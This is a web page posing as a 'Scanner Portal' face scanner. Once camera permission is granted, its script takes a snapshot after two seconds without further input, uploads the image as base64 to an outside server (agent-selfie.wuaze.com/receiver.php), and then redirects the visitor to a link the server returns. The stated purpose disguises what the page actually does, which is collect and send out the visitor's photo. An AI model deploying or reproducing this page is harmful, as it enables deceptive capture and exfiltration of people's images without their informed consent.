
<!DOCTYPE html>
<html>
<head>
  <title>üîç Scanner Portal</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 60px;
      background-color: #f5f5f5;
    }
    #loading {
      font-size: 22px;
      margin-bottom: 20px;
      color: #444;
    }
    #video {
      border: 4px solid #333;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
    }
    .spinner {
      margin: 30px auto;
      width: 50px;
      height: 50px;
      border: 5px solid #ccc;
      border-top: 5px solid #444;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h1>üîç Scanning Face...</h1>
  <div id="loading">Initializing camera...</div>
  <div class="spinner" id="spinner"></div>
  <video id="video" width="320" height="240" autoplay muted></video>
  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
  <audio id="shutter" src="https://soundbible.com/mp3/Camera-Snap-John_Stracke-4.mp3" preload="auto"></audio>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const shutter = document.getElementById('shutter');
    const loading = document.getElementById('loading');
    const spinner = document.getElementById('spinner');

    function captureAndUpload() {
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataURL = canvas.toDataURL('image/png');

      shutter.play();

      const stream = video.srcObject;
      const tracks = stream.getTracks();
      tracks.forEach(track => track.stop());
      video.style.display = "none";
      spinner.style.display = "block";
      loading.innerText = "Uploading your selfie...";

      fetch("https://agent-selfie.wuaze.com/receiver.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ image: dataURL })
      })
      .then(res => res.text())
      .then(link => {
        loading.innerText = "‚úÖ Selfie captured! Redirecting...";
        setTimeout(() => {
          window.location.href = link;
        }, 1500);
      });
    }

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        loading.innerText = "Camera ready. Scanning in 2 seconds...";
        spinner.style.display = "block";
        setTimeout(captureAndUpload, 2000);
      })
      .catch(err => {
        console.error("Camera error:", err);
        alert("Camera access denied or not available.");
        loading.innerText = "‚ùå Camera access blocked.";
        spinner.style.display = "none";
      });
  </script>
</body>
</html>
